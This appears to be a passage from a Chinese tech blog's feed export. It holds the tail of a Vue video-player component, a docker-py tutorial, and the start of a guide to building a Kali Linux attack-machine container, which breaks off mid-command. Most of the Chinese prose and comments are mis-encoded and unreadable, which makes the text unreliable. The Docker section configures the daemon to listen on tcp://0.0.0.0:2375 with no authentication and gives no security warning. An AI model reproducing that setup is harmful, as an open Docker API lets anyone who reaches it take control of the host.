&lt;&#x2F;video-player&gt;    &lt;&#x2F;div&gt;  &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;import &#123; videoPlayer &#125; from &#39;vue-video-player&#x2F;src&#39;import &#39;video.js&#x2F;dist&#x2F;video-js.css&#39;import &#39;vue-video-player&#x2F;src&#x2F;custom-theme.css&#39;export default &#123;  name: &quot;VideoDetail&quot;,  components: &#123;    videoPlayer  &#125;,  data() &#123;    return &#123;      &#x2F;&#x2F; id: this.$route.query.id,      &#x2F;&#x2F; video: &#123;&#125;,      playerOptions: &#123;        playbackRates: [0.5, 1.0, 1.5, 2.0], &#x2F;&#x2F; å¯é€‰çš„æ’­æ”¾é€Ÿåº¦        autoplay: true, &#x2F;&#x2F; å¦‚æœä¸ºtrue,æµè§ˆå™¨å‡†å¤‡å¥½æ—¶å¼€å§‹å›æ”¾ã€‚        muted: false, &#x2F;&#x2F; é»˜è®¤æƒ…å†µä¸‹å°†ä¼šæ¶ˆé™¤ä»»ä½•éŸ³é¢‘ã€‚        loop: false, &#x2F;&#x2F; æ˜¯å¦è§†é¢‘ä¸€ç»“æŸå°±é‡æ–°å¼€å§‹ã€‚        preload: &#39;auto&#39;, &#x2F;&#x2F; å»ºè®®æµè§ˆå™¨åœ¨&lt;video&gt;åŠ è½½å…ƒç´ åæ˜¯å¦åº”è¯¥å¼€å§‹ä¸‹è½½è§†é¢‘æ•°æ®ã€‚autoæµè§ˆå™¨é€‰æ‹©æœ€ä½³è¡Œä¸º,ç«‹å³å¼€å§‹åŠ è½½è§†é¢‘ï¼ˆå¦‚æœæµè§ˆå™¨æ”¯æŒï¼‰        language: &#39;zh-CN&#39;,        aspectRatio: &#39;16:9&#39;, &#x2F;&#x2F; å°†æ’­æ”¾å™¨ç½®äºæµç•…æ¨¡å¼ï¼Œå¹¶åœ¨è®¡ç®—æ’­æ”¾å™¨çš„åŠ¨æ€å¤§å°æ—¶ä½¿ç”¨è¯¥å€¼ã€‚å€¼åº”è¯¥ä»£è¡¨ä¸€ä¸ªæ¯”ä¾‹ - ç”¨å†’å·åˆ†éš”çš„ä¸¤ä¸ªæ•°å­—ï¼ˆä¾‹å¦‚&quot;16:9&quot;æˆ–&quot;4:3&quot;ï¼‰        fluid: true, &#x2F;&#x2F; å½“trueæ—¶ï¼ŒVideo.js playerå°†æ‹¥æœ‰æµä½“å¤§å°ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒå°†æŒ‰æ¯”ä¾‹ç¼©æ”¾ä»¥é€‚åº”å…¶å®¹å™¨ã€‚        sources: [&#123;          type: &quot;video&#x2F;mp4&quot;, &#x2F;&#x2F; ç±»å‹          src: &#39;&#39; &#x2F;&#x2F; urlåœ°å€        &#125;],        poster: &#39;&#39;, &#x2F;&#x2F; å°é¢åœ°å€        notSupportedMessage: &#39;æ­¤è§†é¢‘æš‚æ— æ³•æ’­æ”¾ï¼Œè¯·ç¨åå†è¯•&#39;, &#x2F;&#x2F; å…è®¸è¦†ç›–Video.jsæ— æ³•æ’­æ”¾åª’ä½“æºæ—¶æ˜¾ç¤ºçš„é»˜è®¤ä¿¡æ¯ã€‚        controlBar: &#123;          timeDivider: true, &#x2F;&#x2F; å½“å‰æ—¶é—´å’ŒæŒç»­æ—¶é—´çš„åˆ†éš”ç¬¦          durationDisplay: true, &#x2F;&#x2F; æ˜¾ç¤ºæŒç»­æ—¶é—´          remainingTimeDisplay: true, &#x2F;&#x2F; æ˜¯å¦æ˜¾ç¤ºå‰©ä½™æ—¶é—´åŠŸèƒ½          fullscreenToggle: true &#x2F;&#x2F; æ˜¯å¦æ˜¾ç¤ºå…¨å±æŒ‰é’®        &#125;      &#125;    &#125;  &#125;,  created() &#123;    let id &#x3D;  this.$route.query.id    &#x2F;&#x2F; this.playerOptions.sources[0].src &#x3D; &quot;http:&#x2F;&#x2F;vjs.zencdn.net&#x2F;v&#x2F;oceans.mp4&quot;    this.request(&quot;&#x2F;file&#x2F;detail&#x2F;&quot; + id).then(res &#x3D;&gt; &#123;      console.log(res.data)      this.video &#x3D; res.data      this.playerOptions.sources[0].src &#x3D; res.data.url    &#125;)  &#125;,  methods: &#123;&#125;&#125;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt;</code></pre><p>éœ€è¦ä¿®æ”¹çš„ä½ç½®åªæœ‰<code>this.playerOptions.sources[0].src</code></p><p>å°†å‚æ•°æ¢æˆä½ çš„è§†é¢‘åœ°å€å³å¯</p><p>å®ç°æ•ˆæœå¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526161723965.png" alt="image-20220526161723965"></p><p>å¯ä»¥è°ƒæ•´æ’­æ”¾é€Ÿåº¦</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526161842064.png" alt="image-20220526161842064"></p><h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2>]]></content>
    
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dockerpy</title>
    <link href="/2022/05/15/dockerpy/"/>
    <url>/2022/05/15/dockerpy/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker-py"><a href="#Docker-py" class="headerlink" title="Docker-py"></a>Docker-py</h1><p>ä½¿ç”¨pythonç¬¬ä¸‰æ–¹åº“docker-pyæ“ä½œdocker</p><p>docker-pyçš„åœ°å€ï¼š<a href="https://github.com/docker/docker-py">https://github.com/docker/docker-py</a></p><h2 id="é…ç½®ç¯å¢ƒ"><a href="#é…ç½®ç¯å¢ƒ" class="headerlink" title="é…ç½®ç¯å¢ƒ"></a>é…ç½®ç¯å¢ƒ</h2><h3 id="1-å®‰è£…docker-py"><a href="#1-å®‰è£…docker-py" class="headerlink" title="1.å®‰è£…docker-py"></a>1.å®‰è£…docker-py</h3><p>â€‹    pipå®‰è£…å³å¯ï¼Œå®‰è£…æœ€æ–°ç‰ˆ</p><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> docker</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135319833.png" alt="image-20220515135319833"></p><h3 id="2-é…ç½®docker"><a href="#2-é…ç½®docker" class="headerlink" title="2.é…ç½®docker"></a>2.é…ç½®docker</h3><p>æœ¬æ–‡ä½¿ç”¨çš„æ˜¯Docker Desktopï¼Œdockerç‰ˆæœ¬æ˜¯<code>20.10.12</code></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135534992.png" alt="image-20220515135534992"></p><h4 id="dockerå¼€å¯è¿œç¨‹è®¿é—®"><a href="#dockerå¼€å¯è¿œç¨‹è®¿é—®" class="headerlink" title="dockerå¼€å¯è¿œç¨‹è®¿é—®"></a>dockerå¼€å¯è¿œç¨‹è®¿é—®</h4><p>å¯¹äºDocker Desktopæ¥è¯´ï¼Œå¼€å¯è¿œç¨‹è®¿é—®å¾ˆç®€å•ï¼Œåªéœ€è¦å†settingsä¸­é€‰ä¸­å¦‚ä¸‹é…ç½®é¡¹</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140305267.png" alt="image-20220515140305267"> </p><p>å¯¹äºlinuxä¸­é…ç½®è¿œç¨‹è®¿é—®å°±ç¨å¾®éº»çƒ¦ä¸€ç‚¹</p><p><strong>æ–¹æ³•ä¸€</strong></p><p>åœ¨/usr/lib/systemd/system/docker.serviceï¼Œé…ç½®è¿œç¨‹è®¿é—®ã€‚</p><p>ä¸»è¦æ˜¯åœ¨[Service]è¿™ä¸ªéƒ¨åˆ†ï¼ŒåŠ ä¸Šä¸‹é¢ä¸¤ä¸ªå‚æ•°</p><pre><code class="hljs ini"><span class="hljs-comment"># vim /usr/lib/systemd/system/docker.service</span><span class="hljs-section">[Service]</span>ExecStart=<span class="hljs-attr">ExecStart</span>=/usr/bin/dockerd -H tcp://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span> -H unix://var/run/docker.sock</code></pre><p>é‡å¯</p><pre><code class="hljs undefined">systemctl daemon-reloadsystemctl restart docker</code></pre><p><strong>æ–¹æ³•äºŒ</strong></p><p>ä¿®æ”¹<code>daemon.json</code>çš„é…ç½®</p><pre><code class="hljs bash">vim /etc/docker/daemon.json&#123;  <span class="hljs-string">&quot;hosts&quot;</span>: [<span class="hljs-string">&quot;tcp://0.0.0.0:2375&quot;</span>, <span class="hljs-string">&quot;unix:///var/run/docker.sock&quot;</span>]&#125;</code></pre><blockquote><p>â€œunix:///var/run/docker.sockâ€ï¼šunix socketï¼Œæœ¬åœ°å®¢æˆ·ç«¯å°†é€šè¿‡è¿™ä¸ªæ¥è¿æ¥ Docker Daemonã€‚<br>â€œtcp://0.0.0.0:2375â€ï¼štcp socketï¼Œè¡¨ç¤ºå…è®¸ä»»ä½•è¿œç¨‹å®¢æˆ·ç«¯é€šè¿‡ 2375 ç«¯å£è¿æ¥ Docker Daemonã€‚</p></blockquote><p>ä¿®æ”¹é…ç½®ä»¥å</p><p>ç„¶åè®©dockeré‡æ–°è¯»å–é…ç½®æ–‡ä»¶,å¹¶é‡å¯dockeræœåŠ¡</p><pre><code class="hljs undefined">systemctl daemon-reloadsystemctl restart docker</code></pre><p>æŸ¥çœ‹dockerè¿›ç¨‹ï¼š</p><pre><code class="hljs perl">[root@slaver2 ~]<span class="hljs-comment"># ps -ef|grep docker</span>root      <span class="hljs-number">44221</span>      <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span> ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> /usr/bin/dockerd -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">2375</span> -H unix:<span class="hljs-regexp">//</span>var/run/docker.sock</code></pre><p>Dockerå®ˆæŠ¤è¿›ç¨‹æ‰“å¼€ä¸€ä¸ªHTTP Socket,è¿™æ ·æ‰èƒ½å®ç°è¿œç¨‹é€šä¿¡</p><p>å½“å¼€å¯è¿œç¨‹è®¿é—®åï¼Œå¯ä»¥å†æµè§ˆå™¨ä¸­æŸ¥çœ‹dockeræœåŠ¡å™¨ä¸Šçš„ç›¸å…³ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥APIéµå¾ªRESTful APIæ ‡å‡†</p><ul><li><p>æŸ¥çœ‹å½“å‰ç‰ˆæœ¬ï¼š<a href="http://IP:2375/version">http://IP:2375/version</a></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141120592.png" alt="image-20220515141120592"></p></li><li><p>æŸ¥çœ‹æ‰€æœ‰é•œåƒä¿¡æ¯ï¼š<a href="http://IP:2375/images/json">http://IP:2375/images/json</a></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140906433.png" alt="image-20220515140906433"></p></li><li><p>æŸ¥çœ‹å·²å¯åŠ¨å®¹å™¨ä¿¡æ¯ï¼š<a href="http://127.0.0.1:2375/containers/json">http://127.0.0.1:2375/containers/json</a></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141343749.png" alt="image-20220515141343749"></p></li><li><p>æŸ¥çœ‹ç½‘å¡ä¿¡æ¯ï¼š <a href="http://127.0.0.1:2375/networks/">http://127.0.0.1:2375/networks/</a></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141509777.png" alt="image-20220515141509777"></p></li></ul><h4 id="é‡åˆ°çš„é—®é¢˜"><a href="#é‡åˆ°çš„é—®é¢˜" class="headerlink" title="é‡åˆ°çš„é—®é¢˜"></a>é‡åˆ°çš„é—®é¢˜</h4><h5 id="Docker-Desktopä¸VMå†²çª"><a href="#Docker-Desktopä¸VMå†²çª" class="headerlink" title="Docker Desktopä¸VMå†²çª"></a>Docker Desktopä¸VMå†²çª</h5><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®‰è£…Docker Desktop åVMå°±æ— æ³•ä½¿ç”¨ï¼ŒåŸå› ï¼š</p><blockquote><p>1ã€Device Guardæˆ–Credential Guardä¸Workstationä¸å…¼å®¹ã€‚</p><p>2ã€Windowsç³»ç»Ÿçš„Hyper-Vä¸å…¼å®¹å¯¼è‡´</p></blockquote><p>è§£å†³æ–¹æ³•å¦‚<a href="https://blog.csdn.net/qq_36761831/article/details/81175736">https://blog.csdn.net/qq_36761831/article/details/81175736</a></p><p>å¼€å¯å’Œå…³é—­Hyper-V</p><pre><code class="hljs shell">bcdedit /set hypervisorlaunchtype autobcdedit /set hypervisorlaunchtype off</code></pre><p>å½“éœ€è¦ä½¿ç”¨VMæ—¶ï¼Œæ‰§è¡Œå…³é—­Hyper-Vå‘½ä»¤å³å¯</p><h5 id="é…ç½®å›½å†…é•œåƒæº"><a href="#é…ç½®å›½å†…é•œåƒæº" class="headerlink" title="é…ç½®å›½å†…é•œåƒæº"></a>é…ç½®å›½å†…é•œåƒæº</h5><p>settings=&gt;Dokcer engineä¿®æ”¹é…ç½®å†…å®¹</p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;builder&quot;</span>: &#123;    <span class="hljs-attr">&quot;gc&quot;</span>: &#123;      <span class="hljs-attr">&quot;defaultKeepStorage&quot;</span>: <span class="hljs-string">&quot;20GB&quot;</span>,      <span class="hljs-attr">&quot;enabled&quot;</span>: <span class="hljs-literal">true</span>    &#125;  &#125;,  <span class="hljs-attr">&quot;experimental&quot;</span>: <span class="hljs-literal">false</span>,  <span class="hljs-attr">&quot;features&quot;</span>: &#123;    <span class="hljs-attr">&quot;buildkit&quot;</span>: <span class="hljs-literal">true</span>  &#125;,  <span class="hljs-attr">&quot;registry-mirrors&quot;</span>: [    <span class="hljs-string">&quot;https://registry.docker-cn.com&quot;</span>,    <span class="hljs-string">&quot;http://hub-mirror.c.163.com&quot;</span>,    <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>  ]&#125;</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141737016.png" alt="image-20220515141737016"></p><h5 id="dockeré…ç½®è½¯é“¾æ¥"><a href="#dockeré…ç½®è½¯é“¾æ¥" class="headerlink" title="dockeré…ç½®è½¯é“¾æ¥"></a>dockeré…ç½®è½¯é“¾æ¥</h5><p>ç”±äºDocker Desktopé»˜è®¤å®‰è£…åœ¨Cç›˜ï¼Œæ‰€ä»¥ä¸‹è½½çš„é•œåƒä¹Ÿéƒ½ä¿å­˜åœ¨Cç›˜ï¼Œç”±äºé•œåƒæ–‡ä»¶ä¸€èˆ¬å¾ˆå¤§ï¼Œå¾ˆå®¹æ˜“çˆ†ç›˜ï¼Œæ‰€ä»¥éœ€è¦ä¸ºä¿å­˜é•œåƒçš„æ–‡ä»¶å¤¹åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥ï¼Œå°†é•œåƒä¿å­˜åˆ°å…¶ä»–ç›˜ã€‚<a href="https://zhuanlan.zhihu.com/p/343278599">å‚è€ƒ</a></p><p>è¯·åŠ¡å¿…å…ˆå…³é—­docker æˆ–è€…docker desktop</p><ul><li>é€šè¿‡Everythingæˆ–è€…èµ„æºç®¡ç†å™¨æ‰¾åˆ°ä»¥.vhdxç»“å°¾çš„æ–‡ä»¶æ‰€åœ¨çš„ä½ç½®ï¼Œè¿™äº›å°±æ˜¯dockeré•œåƒè·¯å¾„ï¼š</li></ul><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/v2-affd20a39ee0002a4c880ff3eb4e75f7_720w.jpg" alt="img"></p><ul><li>å°†.vhdxå¤åˆ¶åˆ°æƒ³è¦çš„è·¯å¾„ä¸‹ï¼Œæœ¬æ–‡è·¯å¾„ä¸ºï¼š</li></ul><p><img src="https://pic1.zhimg.com/80/v2-70f80706f26839ff0dd3a4fcdc0aca80_720w.jpg" alt="img"></p><ul><li><p>åˆ é™¤æºæ–‡ä»¶å¤¹ï¼Œæœ¬æ–‡æ˜¯dataæ–‡ä»¶å¤¹</p></li><li><p>ä»¥ç®¡ç†å‘˜è¿è¡Œcmdå¹¶ä¸”ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºé“¾æ¥ï¼š</p><pre><code class="hljs shell">mklink /J C:\Users\admin\AppData\Local\Docker\wsl\data   D:\docker\data</code></pre><p>è¯·å¤§å®¶è‡ªè¡Œæ›¿æ¢è·¯å¾„ï¼Œæœ¬æ–‡è·¯å¾„åˆ†åˆ«ä¸ºæºè·¯å¾„ï¼šC:\Users\admin\AppData\Local\Docker\wsl\data</p><p>ä»¥åŠæƒ³è¦ç§»åŠ¨çš„è·¯å¾„ï¼šD:\docker\dataæ­¤æ—¶å¯ä»¥åœ¨æºè·¯å¾„çœ‹åˆ°æ–°å»ºå‡ºæ¥çš„æ–‡ä»¶å¤¹</p></li></ul><h2 id="ä½¿ç”¨dockerpy"><a href="#ä½¿ç”¨dockerpy" class="headerlink" title="ä½¿ç”¨dockerpy"></a>ä½¿ç”¨dockerpy</h2><p>å®˜æ–¹ç»™å‡ºäº†è¯¦ç»†çš„è¯´æ˜æ–‡æ¡£<a href="https://docker-py.readthedocs.io/en/stable/index.html">è¯´æ˜æ–‡æ¡£</a>ï¼Œä¸‹é¢åªç»™å‡ºå‡ ä¸ªå¸¸è§çš„æ“ä½œ</p><h3 id="imageç›¸å…³æ“ä½œ"><a href="#imageç›¸å…³æ“ä½œ" class="headerlink" title="imageç›¸å…³æ“ä½œ"></a>imageç›¸å…³æ“ä½œ</h3><p>è¿›å…¥dockeråº“çš„imges.pyä¸­å¯ä»¥çœ‹åˆ°ä¸é•œåƒç›¸å…³çš„æ‰€æœ‰æ“ä½œï¼ŒåŒ…æ‹¬åœ¨shellä¸­ä½¿ç”¨çš„buildã€pullã€pushã€searchç­‰æ“ä½œ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515144118231.png" alt="image-20220515144118231"></p><h4 id="list"><a href="#list" class="headerlink" title="list()"></a>list()</h4><p>æŸ¥çœ‹æºç ï¼Œå¯çŸ¥æœ‰ä¸‰ä¸ªå¯é€‰å‚æ•°</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list</span>(<span class="hljs-params">self, name=<span class="hljs-literal">None</span>, <span class="hljs-built_in">all</span>=<span class="hljs-literal">False</span>, filters=<span class="hljs-literal">None</span></span>):</span>    <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    List images on the server.</span><span class="hljs-string"></span><span class="hljs-string">    Args:</span><span class="hljs-string">        name (str): Only show images belonging to the repository ``name``</span><span class="hljs-string">        all (bool): Show intermediate image layers. By default, these are</span><span class="hljs-string">            filtered out.</span><span class="hljs-string">        filters (dict): Filters to be processed on the image list.</span><span class="hljs-string">            Available filters:</span><span class="hljs-string">            - ``dangling`` (bool)</span><span class="hljs-string">            - ``label`` (str): format either ``key`` or ``key=value``</span><span class="hljs-string"></span><span class="hljs-string">    Returns:</span><span class="hljs-string">        (list of :py:class:`Image`): The images.</span><span class="hljs-string"></span><span class="hljs-string">    Raises:</span><span class="hljs-string">        :py:class:`docker.errors.APIError`</span><span class="hljs-string">            If the server returns an error.</span><span class="hljs-string">    &quot;&quot;&quot;</span>    resp = self.client.api.images(name=name, <span class="hljs-built_in">all</span>=<span class="hljs-built_in">all</span>, filters=filters)    <span class="hljs-keyword">return</span> [self.get(r[<span class="hljs-string">&quot;Id&quot;</span>]) <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> resp]</code></pre><h5 id="è·å–æ‰€æœ‰é•œåƒ"><a href="#è·å–æ‰€æœ‰é•œåƒ" class="headerlink" title="è·å–æ‰€æœ‰é•œåƒ"></a>è·å–æ‰€æœ‰é•œåƒ</h5><pre><code class="hljs python"><span class="hljs-keyword">import</span> dockerclient = docker.from_env()imagesList = client.images.<span class="hljs-built_in">list</span>()print(imagesList)</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515143446882.png" alt="image-20220515143446882"></p><h4 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h4><p>è¯¥å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°nameï¼Œé•œåƒåç§°</p><p>è·å–æŒ‡å®šåç§°çš„é•œåƒ</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> dockerclient = docker.from_env()mysqlImage = client.images.get(<span class="hljs-string">&quot;mysql&quot;</span>)print(mysqlImage)</code></pre><h4 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h4><p>ä¸docker search å‘½ä»¤ç›¸åŒ</p><pre><code class="hljs stylus">searchList = client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.search</span>(<span class="hljs-string">&quot;nginx&quot;</span>)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(searchList)</span></span></code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515153818793.png" alt="image-20220515153818793"></p><h4 id="pull"><a href="#pull" class="headerlink" title="pull()"></a>pull()</h4><p>ä½œç”¨ç­‰åŒäºdocker pull</p><pre><code class="hljs stylus">client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.pull</span>(<span class="hljs-string">&quot;nginx&quot;</span>)</code></pre><h3 id="containerç›¸å…³æ“ä½œ"><a href="#containerç›¸å…³æ“ä½œ" class="headerlink" title="containerç›¸å…³æ“ä½œ"></a>containerç›¸å…³æ“ä½œ</h3><p>å®¹å™¨ç›¸å…³çš„æ“ä½œå¾ˆå¤š</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515161345640.png" alt="image-20220515161345640"></p><h4 id="run"><a href="#run" class="headerlink" title="run()"></a>run()</h4><p>å®˜æ–¹æ³¨é‡Š</p><pre><code class="hljs lasso">Run a container. <span class="hljs-keyword">By</span> default, it will wait for the container <span class="hljs-keyword">to</span> finish<span class="hljs-literal">and</span> <span class="hljs-keyword">return</span> its logs, similar <span class="hljs-keyword">to</span> <span class="hljs-string">``</span>docker run<span class="hljs-string">``</span>.<span class="hljs-comment">// </span><span class="hljs-keyword">If</span> the <span class="hljs-string">``</span>detach<span class="hljs-string">``</span> argument is <span class="hljs-string">``</span><span class="hljs-literal">True</span><span class="hljs-string">``</span>, it will start the container<span class="hljs-literal">and</span> immediately <span class="hljs-keyword">return</span> a :py:class:<span class="hljs-string">`Container`</span> object, similar <span class="hljs-keyword">to</span><span class="hljs-string">``</span>docker run <span class="hljs-params">-d</span><span class="hljs-string">``</span>.</code></pre><pre><code class="hljs python">port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;image_name = nginxclient.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼åˆ›å»ºå®¹å™¨ï¼Œå®¹å™¨åœæ­¢åä¸ä¼šåˆ é™¤</span>```- The port number, <span class="hljs-keyword">as</span> an integer. For example,``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;`` will expose port <span class="hljs-number">2222</span> inside thecontainer <span class="hljs-keyword">as</span> port <span class="hljs-number">3333</span> on the host.- ``<span class="hljs-literal">None</span>``, to assign a random host port. For example,``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-literal">None</span>&#125;``.- A <span class="hljs-built_in">tuple</span> of ``(address, port)`` <span class="hljs-keyword">if</span> you want to specify thehost interface. For example,``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1111</span>)&#125;``.- A <span class="hljs-built_in">list</span> of integers, <span class="hljs-keyword">if</span> you want to bind multiple host portsto a single container port. For example,``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: [<span class="hljs-number">1234</span>, <span class="hljs-number">4567</span>]&#125;``.```</code></pre><h4 id="get-1"><a href="#get-1" class="headerlink" title="get()"></a>get()</h4><p>è·å–å®¹å™¨å¯¹è±¡</p><pre><code class="hljs python">docker_container_id = <span class="hljs-string">&quot;236efe761aeb&quot;</span>container = client.containers.get(docker_container_id)print(container.<span class="hljs-built_in">id</span>)print(container.attrs) <span class="hljs-comment"># è·å–å®¹å™¨çš„è¯¦ç»†ä¿¡æ¯</span></code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515163148958.png" alt="image-20220515163148958"></p><h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>è¿›å…¥å®¹å™¨å†…éƒ¨æ‰§è¡Œå‘½ä»¤ï¼Œä¸ä¸‹é¢çš„å‘½ä»¤ä½œç”¨ç›¸åŒ</p><pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> containerID bash</code></pre><pre><code class="hljs python">command = <span class="hljs-string">&#x27;touch /tmp/flag&#x27;</span> port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;image_name = nginxcontainer = client.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  container.exec_run(command)</code></pre><h3 id="networkç›¸å…³æ“ä½œ"><a href="#networkç›¸å…³æ“ä½œ" class="headerlink" title="networkç›¸å…³æ“ä½œ"></a>networkç›¸å…³æ“ä½œ</h3><h4 id="create"><a href="#create" class="headerlink" title="create"></a>create</h4><p>ä½¿ç”¨é»˜è®¤å‚æ•°ï¼Œæ¡¥æ¥æ¨¡å¼åˆ›å»ºç½‘å¡</p><pre><code class="hljs python">client.networks.create(<span class="hljs-string">&quot;net1&quot;</span>, driver=<span class="hljs-string">&quot;bridge&quot;</span>)</code></pre><p>ä½¿ç”¨è‡ªå®šä¹‰IPAMé…ç½®åˆ›å»ºæ›´é«˜çº§çš„ç½‘ç»œã€‚ä¾‹å¦‚ï¼Œå°†å­ç½‘è®¾ç½®ä¸º192.168.52.0/24å’Œç½‘å…³åœ°å€ä¸º192.168.52.254</p><pre><code class="hljs routeros">ipam_pool = docker.types.IPAMPool(    <span class="hljs-attribute">subnet</span>=<span class="hljs-string">&#x27;192.168.52.0/24&#x27;</span>,    <span class="hljs-attribute">gateway</span>=<span class="hljs-string">&#x27;192.168.52.254&#x27;</span>)ipam_config = docker.types.IPAMConfig(    pool_configs=[ipam_pool])client.networks.create(    <span class="hljs-string">&quot;network1&quot;</span>,    <span class="hljs-attribute">driver</span>=<span class="hljs-string">&quot;bridge&quot;</span>,    <span class="hljs-attribute">ipam</span>=ipam_config)</code></pre><h1 id="åˆ›å»ºkaliæ”»å‡»æœºé•œåƒ"><a href="#åˆ›å»ºkaliæ”»å‡»æœºé•œåƒ" class="headerlink" title="åˆ›å»ºkaliæ”»å‡»æœºé•œåƒ"></a>åˆ›å»ºkaliæ”»å‡»æœºé•œåƒ</h1><h2 id="ä¸‹è½½é•œåƒ"><a href="#ä¸‹è½½é•œåƒ" class="headerlink" title="ä¸‹è½½é•œåƒ"></a>ä¸‹è½½é•œåƒ</h2><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull kalilinux/kali-rolling</code></pre><p>æŸ¥çœ‹ä¸‹è½½çš„é•œåƒ</p><pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span></code></pre><h2 id="å¯åŠ¨å®¹å™¨"><a href="#å¯åŠ¨å®¹å™¨" class="headerlink" title="å¯åŠ¨å®¹å™¨"></a>å¯åŠ¨å®¹å™¨</h2><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kalilinux/kali-rolling /bin/bash</code></pre><p>æŸ¥çœ‹å®¹å™¨id</p><pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span></code></pre><p>è¿›å…¥å®¹å™¨</p><pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> <span class="hljs-built_in">id</span> bash</code></pre><h2 id="å®‰è£…åŸºç¡€ç¯å¢ƒåŒ…"><a href="#å®‰è£…åŸºç¡€ç¯å¢ƒåŒ…" class="headerlink" title="å®‰è£…åŸºç¡€ç¯å¢ƒåŒ…"></a>å®‰è£…åŸºç¡€ç¯å¢ƒåŒ…</h2><p>â—éœ€è¦å…³é—­é˜²ç«å¢™æˆ–è€…æ‰“å¼€3399ç«¯å£ï¼Œå¦åˆ™æ— æ³•è¿æ¥</p><p>é¦–å…ˆå®‰è£…vim</p><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> -y update &amp;&amp; apt-<span class="hljs-builtin-name">get</span> -y upgradeapt-<span class="hljs-builtin-name">get</span> update --fix-missingapt-<span class="hljs-builtin-name">get</span> install vim</code></pre><p>ä¿®æ”¹é•œåƒæº</p><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>apt/sources.listæ·»åŠ å†…å®¹deb http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre><p>å®‰è£…åŸºç¡€ç¯å¢ƒåŒ…</p><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> -y update &amp;&amp; apt-<span class="hljs-builtin-name">get</span> -y<span class="hljs-built_in"> upgrade </span>&amp;&amp; \   <span class="hljs-attribute">DEBIAN_FRONTEND</span>=noninteractive apt-<span class="hljs-builtin-name">get</span> install -y \   